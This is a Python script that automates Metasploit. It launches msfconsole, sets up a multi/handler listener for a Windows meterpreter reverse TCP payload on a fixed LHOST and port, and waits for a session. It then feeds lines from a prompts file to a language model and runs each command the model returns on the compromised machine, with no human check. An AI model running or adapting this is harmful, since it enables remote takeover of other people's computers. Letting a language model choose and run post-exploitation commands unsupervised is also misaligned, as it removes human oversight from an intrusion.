import pexpect
import sys
import json

from utilities import gpt_utils

# Define a custom timeout value in seconds
custom_timeout = 30  # For example, 30 seconds


# Define a file-like wrapper to decode bytes to strings before writing to stdout
class OutputWrapper:
    def __init__(self, file):
        self.file = file

    def write(self, s):
        # Decode bytes to string and write to the specified file (stdout)
        if isinstance(s, bytes):
            s = s.decode("utf-8")
        self.file.write(s)
        self.file.flush()

    def flush(self):
        self.file.flush()


# Start msfconsole using pexpect
child = pexpect.spawn("msfconsole")
child.logfile = OutputWrapper(sys.stdout)  # Use the wrapper for logging

# Wait for the msfconsole prompt with custom timeout
child.expect("msf6", timeout=custom_timeout)

# Send the first command
child.sendline("use exploit/multi/handler")

# Wait for the command to be executed and the prompt to appear again with custom timeout
child.expect("msf6", timeout=custom_timeout)

# Send the next command
# Set the payload to match the one generated by msfvenom
child.sendline("set PAYLOAD windows/meterpreter/reverse_tcp")

# Repeat the process for each command with custom timeout
child.expect("msf6", timeout=custom_timeout)
child.sendline("set LHOST 192.168.162.11")
child.expect("msf6", timeout=custom_timeout)
child.sendline("set LPORT 8080")
child.expect("msf6", timeout=custom_timeout)
child.sendline("exploit")

# Wait for the 'exploit' command to execute or for a specific output with custom timeout
# If you want to interact with the session, you can use child.interact() here
child.expect("meterpreter", timeout=custom_timeout)

# Read the commands from the commands text file one by one
with open("prompts/commands_to_run.txt", "r") as file:
    for line in file:
        gpt_output = json.loads(gpt_utils.run_llm_query(line.strip()))
        child.sendline(gpt_output["command"])
        child.expect(gpt_output["expect"], timeout=custom_timeout)

# Don't forget to properly terminate the session
# child.sendline("exit")
# child.expect(
#    pexpect.EOF, timeout=custom_timeout
# )  # Ensure all output has been logged before closing
child.close()